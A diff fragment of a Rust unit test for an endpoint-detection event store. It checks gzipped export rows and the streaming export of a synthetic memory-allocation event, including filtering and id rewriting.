+        dec.read_to_string(&mut gunzipped).unwrap();
+        let row: serde_json::Value = serde_json::from_str(gunzipped.lines().next().unwrap()).unwrap();
+        assert_eq!(row["key"], "00000000000000a1");
+        assert_eq!(row["exe"], r"C:\Windows\System32\powershell.exe");
+        assert_eq!(row["event"], "SCRIPT_BLOCK_ACTIVITY");
+        assert_eq!(row["count"], 2);
+        assert_eq!(row["count_all"], 2);
+        assert_eq!(row["machine_id"], "host-a");
+
+        // Fast id splice for edr_events streaming export.
+        let events = EventLog::new(false);
+        ingest_edr_events(
+            &store,
+            &events,
+            &EdrEventBatch {
+                machine_id: "host-a".into(),
+                events: vec![EdrEventRecord {
+                    timestamp: 1700000500,
+                    time_iso: "2026-11-26T10:10:00Z".into(),
+                    event_type: "SANCTUM_GHOST_HUNT".into(),
+                    pid: 999,
+                    process_name: "drop.exe".into(),
+                    exe_path: r"C:\Temp\drop.exe".into(),
+                    details: Some("NtAllocateVirtualMemory".into()),
+                    raw: serde_json::json!({"syscall_name": "NtAllocateVirtualMemory"}),
+                }],
+            },
+        );
+        let mut raw_stream = Vec::new();
+        let n_ev = store
+            .stream_export_edr_events_to(
+                Some("SANCTUM_GHOST_HUNT,AGENT_START"),
+                Some("host-a"),
+                Some("ntallocatevirtualmemory"),
+                Some(5),
+                &mut raw_stream,
+            )
+            .unwrap();
+        assert_eq!(n_ev, 1);
+        let ev_line: serde_json::Value =
+            serde_json::from_str(std::str::from_utf8(&raw_stream).unwrap().lines().next().unwrap()).unwrap();
+        assert!(ev_line["id"].as_u64().unwrap() > 0, "id splice must rewrite id=0 to rowid");
+        assert_eq!(ev_line["event_type"], "SANCTUM_GHOST_HUNT");
     }
 }
